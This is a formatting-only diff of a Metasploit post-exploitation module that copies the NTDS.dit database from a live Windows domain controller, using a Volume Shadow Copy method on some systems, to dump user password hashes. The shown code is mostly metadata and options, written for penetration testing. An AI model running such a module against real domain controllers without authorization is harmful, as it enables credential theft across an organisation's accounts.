@@ -17,23 +17,25 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-      'Name'         => 'Windows Domain Controller Hashdump',
-      'Description'  => %q(
-        This module attempts to copy the NTDS.dit database from a live Domain Controller
-        and then parse out all of the User Accounts. It saves all of the captured password
-        hashes, including historical ones.
-        ),
-      'License'      => MSF_LICENSE,
-      'Author'       => ['theLightCosine'],
-      'Platform'     => [ 'win' ],
-      'SessionTypes' => [ 'meterpreter' ]
+        'Name' => 'Windows Domain Controller Hashdump',
+        'Description' => %q{
+          This module attempts to copy the NTDS.dit database from a live Domain Controller
+          and then parse out all of the User Accounts. It saves all of the captured password
+          hashes, including historical ones.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['theLightCosine'],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ]
       )
     )
     deregister_options('SMBUser', 'SMBPass', 'SMBDomain')
     register_options(
-      [OptBool.new(
-        'CLEANUP', [ true, 'Automatically delete ntds backup created', true]
-      )]
+      [
+        OptBool.new(
+          'CLEANUP', [ true, 'Automatically delete ntds backup created', true]
+        )
+      ]
     )
   end
 
@@ -79,7 +81,7 @@ class MetasploitModule < Msf::Post
 
   def copy_database_file
     database_file_path = nil
-    case  sysinfo["OS"]
+    case sysinfo["OS"]
     when /2003| \.NET/
       print_status "Using Volume Shadow Copy Method"
       database_file_path = vss_method
@@ -135,6 +137,7 @@ class MetasploitModule < Msf::Post
     unless session_compat?
       return false
     end
+
     load_extapi
     return true
   end
